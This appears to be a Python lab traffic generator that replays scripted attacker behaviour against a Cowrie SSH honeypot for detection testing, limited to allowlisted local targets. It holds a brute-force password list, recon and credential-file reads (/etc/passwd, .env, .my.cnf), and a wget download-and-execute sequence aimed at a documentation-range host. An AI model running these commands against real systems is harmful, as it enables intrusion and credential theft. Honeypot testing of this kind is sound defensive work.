"""Bounded, authorized demo traffic against the PS04 Cowrie decoy.

This is a *lab traffic generator* for local testing and rehearsal. It opens
real SSH connections to the decoy so Cowrie writes genuine log events; it never
writes to the collector, the SOC backend, or any log file.

Safety limits:
- The target must be in DEMO_ALLOWED_TARGETS (default: cowrie, localhost, 127.0.0.1).
- Every scenario uses a fixed, built-in command list. There is no way to pass
  arbitrary commands or credential lists on the command line.
- Authentication attempts per run are capped (MAX_AUTH_ATTEMPTS).

Usage: python scenarios.py {bruteforce,recon,honeytoken,download,benign,full}
"""

from __future__ import annotations

import argparse
import os
import socket
import sys
import time

import paramiko

MAX_AUTH_ATTEMPTS = 12
DECOY_USER = "backup"
DECOY_PASSWORD = "Backup@2024"  # synthetic credential defined in cowrie/userdb.txt

# (username, password) guesses; all are rejected by the decoy's userdb.
GUESSES: list[tuple[str, str]] = [
    ("root", "root"),
    ("root", "123456"),
    ("root", "toor"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "P@ssw0rd"),
    ("backup", "backup"),
    ("backup", "backup123"),
]

RECON_COMMANDS = [
    "whoami",
    "id",
    "uname -a",
    "cat /etc/os-release",
    "cat /proc/cpuinfo | grep 'model name' | head -1",
    "cat /etc/passwd",
    "ip addr",
    "cat /etc/resolv.conf",
    "netstat -tunlp",
    "ps aux",
]

HONEYTOKEN_COMMANDS = [
    "cd /var/backups",
    "ls -la",
    "ls -la db app",
    "cat db/mysql_nightly.sh",
    "cat db/.my.cnf",
    "cat app/.env",
]

# 192.0.2.0/24 is TEST-NET-1 (RFC 5737): reserved for documentation, never routed.
# Cowrie's out_addr=127.0.0.1 additionally makes the download fail locally.
DOWNLOAD_COMMANDS = [
    "cd /tmp",
    "wget http://192.0.2.10/bins/update.sh -O /tmp/update.sh",
    "chmod +x /tmp/update.sh",
    "./update.sh",
]

BENIGN_COMMANDS = ["date", "uptime", "df -h"]


def check_target(host: str) -> None:
    allowed = {
        t.strip()
        for t in os.environ.get("DEMO_ALLOWED_TARGETS", "cowrie,localhost,127.0.0.1").split(",")
        if t.strip()
    }
    if host not in allowed:
        sys.exit(f"refusing target {host!r}: not in DEMO_ALLOWED_TARGETS={sorted(allowed)}")


def try_login(host: str, port: int, user: str, password: str) -> bool:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            host, port=port, username=user, password=password,
            look_for_keys=False, allow_agent=False, timeout=10, banner_timeout=10, auth_timeout=10,
        )
        return True
    except paramiko.AuthenticationException:
        return False
    finally:
        client.close()


def bruteforce(host: str, port: int) -> None:
    attempts = GUESSES[: MAX_AUTH_ATTEMPTS - 1]
    for user, password in attempts:
        ok = try_login(host, port, user, password)
        print(f"[bruteforce] {user}:{'*' * len(password)} -> {'ACCEPTED' if ok else 'rejected'}")
        time.sleep(0.4)
    ok = try_login(host, port, DECOY_USER, DECOY_PASSWORD)
    print(f"[bruteforce] {DECOY_USER}:<decoy password> -> {'ACCEPTED' if ok else 'rejected'}")


def interactive(host: str, port: int, label: str, commands: list[str], pause: float = 0.8) -> None:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host, port=port, username=DECOY_USER, password=DECOY_PASSWORD,
        look_for_keys=False, allow_agent=False, timeout=10,
    )
    try:
        chan = client.invoke_shell(term="xterm", width=120, height=40)
        chan.settimeout(5)
        _drain(chan, 1.0)
        for cmd in commands:
            print(f"[{label}] $ {cmd}")
            chan.send((cmd + "\n").encode())
            out = _drain(chan, pause)
            for line in out.splitlines()[1:6]:
                print(f"[{label}]   {line}")
        chan.send(b"exit\n")
        _drain(chan, 0.5)
    finally:
        client.close()


def _drain(chan: paramiko.Channel, wait: float) -> str:
    time.sleep(wait)
    chunks: list[bytes] = []
    while chan.recv_ready():
        chunks.append(chan.recv(65536))
    return b"".join(chunks).decode("utf-8", "replace")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("scenario", choices=["bruteforce", "recon", "honeytoken", "download", "benign", "full"])
    args = parser.parse_args()

    host = os.environ.get("DEMO_TARGET_HOST", "127.0.0.1")
    port = int(os.environ.get("DEMO_TARGET_PORT", "2222"))
    check_target(host)
    try:
        socket.create_connection((host, port), timeout=5).close()
    except OSError as exc:
        sys.exit(f"cannot reach {host}:{port}: {exc}")

    print(f"target {host}:{port} scenario={args.scenario}")
    if args.scenario in ("bruteforce", "full"):
        bruteforce(host, port)
    if args.scenario in ("recon", "full"):
        interactive(host, port, "recon", RECON_COMMANDS)
    if args.scenario in ("honeytoken", "full"):
        interactive(host, port, "honeytoken", HONEYTOKEN_COMMANDS)
    if args.scenario in ("download", "full"):
        interactive(host, port, "download", DOWNLOAD_COMMANDS, pause=2.5)
    if args.scenario == "benign":
        interactive(host, port, "benign", BENIGN_COMMANDS)
    print("scenario complete")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
